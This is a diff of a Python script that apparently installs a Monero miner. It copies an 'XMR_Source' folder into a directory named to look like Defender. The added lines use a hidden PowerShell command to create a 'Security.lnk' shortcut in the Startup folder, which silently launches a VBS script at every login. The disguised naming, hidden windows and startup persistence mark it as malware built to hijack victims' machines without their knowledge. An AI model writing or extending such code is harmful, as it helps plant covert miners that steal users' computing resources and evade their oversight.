@@ -57,4 +57,17 @@ if os.path.exists(Defender_Dir):
 shutil.copytree(XMR_Source, Defender_Dir)
 
 os.makedirs(Startup_Dir, exist_ok=True)
-shutil.copy2(Start_Vbs_Path, os.path.join(Startup_Dir, "Security.vbs"))
+
+import subprocess
+Lnk_Path      = os.path.join(Startup_Dir, "Security.lnk")
+Target_Vbs    = os.path.join(Defender_Dir, "Start.vbs")
+Ps_Command    = (
+    f'$Ws = New-Object -ComObject WScript.Shell; '
+    f'$Sc = $Ws.CreateShortcut("{Lnk_Path}"); '
+    f'$Sc.TargetPath = "wscript.exe"; '
+    f'$Sc.Arguments = "\\"{Target_Vbs}\\""; '
+    f'$Sc.WorkingDirectory = "{Defender_Dir}"; '
+    f'$Sc.WindowStyle = 7; '
+    f'$Sc.Save()'
+)
+subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", Ps_Command], check=True)
